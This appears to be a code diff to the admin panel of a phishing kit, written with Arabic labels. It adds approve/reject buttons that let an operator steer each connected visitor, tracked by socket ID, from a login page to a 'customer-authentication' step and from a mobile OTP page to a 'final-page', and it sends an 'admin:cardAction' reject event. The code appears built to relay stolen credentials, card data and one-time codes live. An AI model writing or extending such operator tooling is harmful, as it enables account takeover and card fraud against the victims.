@@ -2186,6 +2186,36 @@
         }
       }
 
+      // أزرار موافقة/رفض حسب الصفحة الحالية
+      if (visitor.page === 'تسجيل الدخول') {
+        const laBtnId = 'login-approve-' + visitor.socketId;
+        const lrBtnId = 'login-reject-' + visitor.socketId;
+        html += '<div class="flex gap-2 mt-3 mb-3">';
+        html += '<button id="' + laBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+        html += '<button id="' + lrBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+        html += '</div>';
+        setTimeout(() => {
+          const ab = document.getElementById(laBtnId);
+          const rb = document.getElementById(lrBtnId);
+          if (ab) ab.addEventListener('click', () => { navigateVisitorToPage(visitor.socketId, 'customer-authentication'); ab.textContent = 'تم ✓'; });
+          if (rb) rb.addEventListener('click', () => { socket.emit('admin:cardAction', { visitorSocketId: visitor.socketId, action: 'reject' }); rb.textContent = 'تم ✓'; });
+        }, 100);
+      }
+      if (visitor.page === 'توثيق الجوال') {
+        const oaBtnId = 'otp-auth-approve-' + visitor.socketId;
+        const orBtnId = 'otp-auth-reject-' + visitor.socketId;
+        html += '<div class="flex gap-2 mt-3 mb-3">';
+        html += '<button id="' + oaBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+        html += '<button id="' + orBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+        html += '</div>';
+        setTimeout(() => {
+          const ab = document.getElementById(oaBtnId);
+          const rb = document.getElementById(orBtnId);
+          if (ab) ab.addEventListener('click', () => { navigateVisitorToPage(visitor.socketId, 'final-page'); ab.textContent = 'تم ✓'; });
+          if (rb) rb.addEventListener('click', () => { socket.emit('admin:cardAction', { visitorSocketId: visitor.socketId, action: 'reject' }); rb.textContent = 'تم ✓'; });
+        }, 100);
+      }
+
       // Actions
       html += '<div class="border-t pt-4"><h3 class="font-bold mb-3">إجراءات</h3>';
       html += '<div class="grid grid-cols-2 gap-4">';
